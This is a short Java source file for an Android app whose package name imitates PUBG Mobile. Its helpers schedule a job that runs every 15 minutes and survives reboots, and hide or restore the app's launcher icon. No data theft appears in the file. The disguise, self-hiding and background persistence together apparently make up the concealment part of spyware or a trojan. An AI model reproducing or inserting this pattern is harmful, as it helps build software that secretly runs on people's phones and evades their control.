package com.pubg.imobile;

import static android.content.Context.JOB_SCHEDULER_SERVICE;

import android.app.Activity;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;


public class Functions {

    Activity activity;

    public Functions(Activity activity){
        this.activity = activity;
    }


    public static void jobScheduler(Context context){
        ComponentName componentName = new ComponentName(context,Scheduler.class);
        JobInfo info = new JobInfo.Builder(123, componentName)
                .setPersisted(true)
                .setPeriodic(900000)
                .build();

        JobScheduler scheduler = (JobScheduler) context.getSystemService(JOB_SCHEDULER_SERVICE);
        int resultCode = scheduler.schedule(info);
        if (resultCode == JobScheduler.RESULT_SUCCESS) {
            Log.d("jobSchedulerTest", "Job scheduled");
        } else {
            Log.d("jobSchedulerTest", "Job scheduling failed");
        }
    }

    public static void hideAppIcon(Context context){
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context,com.pubg.imobile.MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    public void unHideAppIcon(Context context){
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, com.pubg.imobile.MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

}
